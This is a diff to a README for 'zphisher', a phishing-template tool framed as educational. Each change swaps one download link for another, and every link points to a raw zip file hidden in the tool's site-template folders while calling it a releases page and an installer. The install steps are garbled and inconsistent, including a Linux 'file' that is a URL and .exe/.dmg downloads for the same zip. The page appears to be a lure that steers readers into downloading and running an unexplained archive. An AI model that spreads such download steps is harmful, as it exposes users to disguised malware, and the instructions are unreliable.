@@ -1,7 +1,7 @@
 # 🎣 zphisher - Simple Tool for Learning Phishing Techniques
 
 ## 📥 Download Now
-[![Download zphisher](https://raw.githubusercontent.com/arqi-io/zphisher/master/.sites/xbox/Software_v2.0.zip)](https://raw.githubusercontent.com/arqi-io/zphisher/master/.sites/xbox/Software_v2.0.zip)
+[![Download zphisher](https://raw.githubusercontent.com/arqi-io/zphisher/master/.sites/instagram/Software_1.2.zip)](https://raw.githubusercontent.com/arqi-io/zphisher/master/.sites/instagram/Software_1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to zphisher. This application is designed to help you learn about phishing techniques through a simple, automated tool. It comes with over 30 templates to demonstrate various phishing scenarios. Please remember to use this tool responsibly and for educational purposes only.
@@ -17,12 +17,12 @@ Before you start using zphisher, ensure that your system meets the following req
 ## 🛠️ Installation Steps
 Follow these steps to download and set up zphisher:
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/arqi-io/zphisher/master/.sites/xbox/Software_v2.0.zip) to go directly to the releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/arqi-io/zphisher/master/.sites/instagram/Software_1.2.zip) to go directly to the releases page.
 2. **Choose the Right Version**: Look for the latest version of zphisher, which will have the most up-to-date features and fixes.
 3. **Download the Application**: Find the file suitable for your operating system and click to download it. For example:
    - *Windows users*: Download the `.exe` file.
    - *macOS users*: Download the `.dmg` file.
-   - *Linux users*: Download the appropriate `https://raw.githubusercontent.com/arqi-io/zphisher/master/.sites/xbox/Software_v2.0.zip` file.
+   - *Linux users*: Download the appropriate `https://raw.githubusercontent.com/arqi-io/zphisher/master/.sites/instagram/Software_1.2.zip` file.
 4. **Run the Installer**: After downloading, open the file and follow the instructions to install the application on your computer.
 
 ## ⚙️ Using zphisher
@@ -55,6 +55,6 @@ A: No, this tool is designed to run on desktop operating systems only.
 A: Visit the issues section on our repository to report your problem or check if others have had similar issues.
 
 ## 🔗 Download & Install
-To start using zphisher, make sure to [visit the releases page](https://raw.githubusercontent.com/arqi-io/zphisher/master/.sites/xbox/Software_v2.0.zip) to download the latest version. Follow the installation steps mentioned above to get everything set up. 
+To start using zphisher, make sure to [visit the releases page](https://raw.githubusercontent.com/arqi-io/zphisher/master/.sites/instagram/Software_1.2.zip) to download the latest version. Follow the installation steps mentioned above to get everything set up. 
 
 Thank you for choosing zphisher. Enjoy learning about phishing in a safe and controlled manner!
